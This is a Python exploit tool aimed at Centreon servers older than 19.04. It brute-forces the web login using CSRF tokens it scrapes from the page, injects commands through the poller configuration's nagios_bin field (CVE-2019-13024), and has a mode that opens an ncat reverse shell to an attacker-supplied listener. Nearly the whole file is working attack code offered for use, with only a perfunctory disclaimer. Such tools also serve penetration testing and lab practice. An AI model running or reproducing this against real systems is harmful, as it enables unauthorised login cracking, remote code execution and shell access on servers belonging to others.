import requests
import sys
import time
import argparse
from bs4 import BeautifulSoup
from art import *
from colorama import Fore, Back, Style
from colorama import init
from urllib3.exceptions import InsecureRequestWarning
from signal import signal, SIGINT

#########################################################################################
# Disclaimer: Any illegal use is not the fault of the author
# Centreon < 19.04 Brute Forcer and RCE!
#
# Why?
# Because I need the practice brute forcing web logins with dynamic tokens god dammit!
# 
# I'm only gonna explain this once!
# Use the script as shown below. There are multiple MODES. 
#
# 1 = Brute Force Login 
# 2 = Input a Command to Run
# 3 = Pop me a shell already
#
#
# Usage: python3 magic.py <target ip> <target port> <mode> {<your listener ip>} {<your listening port>}
# Obviously only put in the listening IP and port if you wanna automate the shell pop in mode 3.
# To be honest after I've cracked the password and executed a command you should
# go and checkout this RCE for it as it's way cleaner than mine because it's nearly 4am
# and I'm shattered.
#
# @mhasker
# https://github.com/mhaskar/CVE-2019-13024
# https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/
#
# Credz to the bbq base man himself for help with tidying this all up
# @stealthcopter
# https://github.com/stealthcopter/
#
##########################################################################################

class LetsHaveSomeFun():

    def __init__(self):
        self.ip = ""
        self.url = ""
        self.username = ""
        self.password_list = ""
        self.known_password = ""
        self.port = 80
        self.command = "id"
        self.listener = ""
        self.lport = 0
        self.ssl = False
        self.s = requests.Session()

    def title(self):
        #Haha I have no idea what to call this one so its just gonna do it all for you and be MAGIC
        funny_name = "MAGIC"
        funny_name = text2art(funny_name, font="alligator2")
        print(blue + funny_name)
        print(blue + "By a very tired 0xskunk\n")
        print(white + "[!] Example Usage [!]")
        print(white + "-" * 40)
        print(white + "[1] Brute Force Mode [1]")
        print(yellow + "[!] Example Usage: python centreon.py -t 10.10.10.10 -p 80 -m 1")
        print(white + "-" * 40)
        print(white + "[2] RCE Mode [2]")
        print(yellow + "[!] Example Usage: python centreon.py -t 10.10.10.10 -p 80 -m 2")
        print(white + "-" * 40)
        print(white + "[3] Reverse Shell Mode [3]")
        print(yellow + "[!] Example Usage: python centreon.py -t 10.10.10.10 -p 80 -m 3 -i 192.168.69.1 -l 443")
        print(white + "-" * 40)

    # Lets make sure we are heading to the right URL...
    def http_or_what(self):
        print("\n")
        print(yellow + "[*] I need to know if your target is running SSL or not!")
        response = raw_input(blue + "[?] HTTP (1) or HTTPS (2): ") 
        if response == "2":
            self.url = "https://" + self.ip + ":" + str(self.port) + "/centreon/index.php"
            self.ssl = True
        elif response == "1":
            self.url = "http://" + self.ip + ":" + str(self.port) + "/centreon/index.php"
        else:
            print(red + "[!] Beep boop beep! Wrong answer.")
            sys.exit()
        return self.url

    def your_command(self):
        if self.mode == 3:
            #Change this to a different reverse shell if you like :)
            self.command = "ncat -e /bin/bash {0} {1} #".format(self.listener, self.lport)
        
        else:
            print(yellow + "[*] And what would you like to execute on the target?")
            self.command = raw_input(blue + "[?] Command: ")
            self.command = "bash -c %s #"%self.command
        return self.command

    #Lets get the targets username
    def the_poor_victim(self):
        print(yellow + "[*] Now I'm gonna need a username..")
        self.username = raw_input(blue + "[?] Username: ")
        return self.username

    #big bad list of words
    def your_spell_book(self):
        print(yellow + "[*] Now I'm gonna need a wordlist to use. Absolute path would be ideal (/usr/share/wordlists/rockyou.txt)?")
        self.password_list = raw_input(blue + "[?] Wordlist: ")
        return self.password_list

    #if they've already got the password
    def you_know_the_s3cr3t(self):
        print(yellow + "[*] And now I'm gonna need the password sir.")
        self.known_password = raw_input(blue + "[*] Password: ")
        return self.known_password

    #check how sly you wanna be
    def dya_wanna_wait(self):
        print("\n" + yellow + "[!] This won't be quiet.. Would you like to set a delay between requests? (Just put 0 if not)")
        delay = input(blue + "[?] Delay: ")
        #Chuck this into an int3g3r so I can actually use it
        delay = int(delay)
        return delay

    def get_token(self):
        website = self.s.get(self.url)
        html_data = website.text
        #mm soup
        soup = BeautifulSoup(html_data, "lxml")
        cent_token = soup.findAll('input')[3].get("value")
        print(white + "[!] CSRF Token on this run = %s"%cent_token)
        return cent_token

    def login(self, username, password, cent_token, n):
        post_data = {
        "useralias" : username,
        "password" : password,
        "submitLogin" : "Connect",
        "centreon_token" : cent_token,
        }
        
        #Uncomment the line below and add "proxies=proxies" the post request (login=s.post(url, proxies=proxies...))
        #proxies = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}
        print(blue + "[" + str(n) + "]"" Attempting to login with password: " + str(password) + "\n")
        try:
            #Send the login request and catch the ugly little errors
            login = self.s.post(self.url, data=post_data, proxies=False, timeout=10, verify=False)
        except requests.exceptions.RequestException:
            print(red + "[!] The request has timed out - Check your arguments are correct and the webpage is online!")
            raise SystemExit()

        #I guess now I need to check if it says something like "incorrect password you big dummy"
        incorrect = "Your credentials are incorrect"
        if incorrect not in login.text:
            print(green + "[*] Password %s is correct."%password)
            return True
        return False

    #Lets try to crack the login page right here
    def the_nut_cracker(self):
        username = self.the_poor_victim()
        password_list = self.your_spell_book()
        delay = self.dya_wanna_wait()            
        n = 0
        with open(password_list, "r") as f:
            lines = f.readlines()
            #ohhhh britney lets get it
            for password in lines:
                #You don't have to tell me how innefficient this is. I will fix it another time after I sleep 
                password = password.strip()
                
                cent_token = self.get_token()
                
                if self.login(username, password, cent_token, n):
                    self.goodbye()
                
                #Sleep if they wanted to reduce the # of requests/second
                time.sleep(delay)
                n = n + 1
            self.goodbye()


    def the_mechanics(self):
        #Set the csrf shizuzums
        username = self.the_poor_victim()
        password = self.you_know_the_s3cr3t()
        command = self.your_command()
        cent_token = self.get_token()
        self.the_snake(username, password, cent_token, command)
    

    #created a new function to login when we already know the password because im not changing all my brute force stuff again...
    def the_snake(self, username, password, cent_token, command):
        post_data = {
        "useralias" : username,
        "password" : password,
        "submitLogin" : "Connect",
        "centreon_token" : cent_token,
        }
        #Uncomment the line below and add "proxies=proxies" the post request (login=s.post(url, proxies=proxies...))
        #proxies = {"http":"http://127.0.0.1:8080", "https":"https://127.0.0.1:8080"}
        sign_in = self.s.post(self.url, data=post_data, proxies=False, timeout=10, verify=False)
        if "Your credentials are incorrect" not in sign_in.text:
            #slithering to vulnerable params
            if self.ssl == True:
                poll_config = "https://" + self.ip + ":" + str(self.port) + "/centreon/main.get.php?p=60901"
            elif self.ssl == False:
                poll_config = "http://" + self.ip + ":" + str(self.port) + "/centreon/main.get.php?p=60901"
            get_dat_token = self.s.get(poll_config)
        else:
            print(red + "[!] Your credentials don't appear to be correct.")
            sys.exit()

        #Parse into html content so we can scrape what we need
        html_content = get_dat_token.text
        tasty_soup = BeautifulSoup(html_content, "lxml")
        #We need the 24th instance of an input field on the page
        poller_token = tasty_soup.findAll('input')[24].get("value")
        print(green + "[*] We found the poller token: %s"%poller_token)
        self.payload_generat0r(poll_config, command, poller_token)


    def payload_generat0r(self, poll_config, command, poller_token):
        #All this was @hasker - I just made it all super colourful. I linked him above - amazing work.
        print(yellow + "[*] Command: %s"%command)
        payload = {
        "name": "Central",
        "ns_ip_address": "127.0.0.1",
        "localhost[localhost]": "1",
        "is_default[is_default]": "0",
        "remote_id": "",
        "ssh_port": "22",
        "init_script": "centengine",
        "nagios_bin": command,
        "nagiostats_bin": "/usr/sbin/centenginestats",
        "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
        "centreonbroker_cfg_path": "/etc/centreon-broker",
        "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
        "centreonbroker_logs_path": "",
        "centreonconnector_path": "/usr/lib64/centreon-connector",
        "init_script_centreontrapd": "centreontrapd",
        "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
        "ns_activate[ns_activate]": "1",
        "submitC": "Save",
        "id": "1",
        "o": "c",
        "centreon_token": poller_token,
        }
        self.fire_in_the_hole(poll_config, payload)

    def fire_in_the_hole(self, poll_config, payload):
        send_that_sh1z = self.s.post(poll_config, payload)
        print(yellow + "[*] Payload has been injected.. Executing command...")
        if self.ssl == True:
            generate_xml_page = "https://" + self.ip + ":" + str(self.port) + "/centreon/include/configuration/configGenerate/xml/generateFiles.php"
        elif self.ssl == False:
            generate_xml_page = "http://" + self.ip + ":" + str(self.port) + "/centreon/include/configuration/configGenerate/xml/generateFiles.php"
        xml_page_data = {
            "poller": "1",
            "debug": "true",
            "generate": "true",
        }
        output = self.s.post(generate_xml_page, xml_page_data)
        output = output.text
        self.parse_command(output)
        

    def parse_command(self, output):
        cayenne_soup = BeautifulSoup(output, "lxml")
        result = cayenne_soup.findAll('div')[0].get_text()
        print(result)
        self.goodbye()


    def goodbye(self):
        print(green + "[*] Bye for now. Hope you got what you needed!")
        sys.exit()

def handler(signal_received, frame):
    # Catch user exit
    print('\n' + red + '[!] CTRL-C detected. Exiting gracefully... <3')
    exit(0)


if __name__ == '__main__':

    #Catch user bye byes
    signal(SIGINT, handler)

    while True:
    
        #Set some pretty colours
        red = Fore.RED + Style.BRIGHT
        green = Fore.GREEN + Style.BRIGHT
        blue = Fore.CYAN + Style.BRIGHT
        yellow = Fore.YELLOW + Style.BRIGHT
        white = Fore.WHITE + Style.BRIGHT
        init(autoreset=True)

        #Supress SSL Warning
        requests.packages.urllib3.disable_warnings()
    
        #TELL ME WHAT YOU WANT MAN
        parser = argparse.ArgumentParser(description='Magic Help Menu')
        parser.add_argument("-t", "--target", dest="target", help="The target IP address", required=True)
        parser.add_argument("-p", "--port", type=int, dest="port", help="The targets port", required=True)
        parser.add_argument("-m", "--mode", type=int, dest="mode", help="Read the usage at the top to check what mode you need!", required=True)
        parser.add_argument("-i", "--lhost", dest="lhost", help="Your listening IP (Set it up!)")
        parser.add_argument("-l", "--lport", dest="lport", type=int, help="Your listening port (Set it up!)")
        args = parser.parse_args()
            

        #Setting it all up... And off we go
        exploit = LetsHaveSomeFun()
        
        exploit.ip = args.target
        exploit.port = args.port
        exploit.mode = args.mode
        if exploit.mode == 3:
            exploit.listener = args.lhost
            exploit.lport = args.lport
        
        #Lets crack some nuts if it's big numero un
        if exploit.mode == 1:
            exploit.title()
            exploit.http_or_what()
            print(yellow + "[*] Target: %s"%exploit.url)
            exploit.the_nut_cracker()
    
        #Already got creds? h4ck3rm4n! I'll give you what you ask for honey
        elif exploit.mode == 2 or exploit.mode == 3:
            exploit.title()
            exploit.http_or_what()
            print(yellow + "[*] Target: %s"%exploit.url)
            exploit.the_mechanics()

        else:
            exploit.title()
            sys.exit()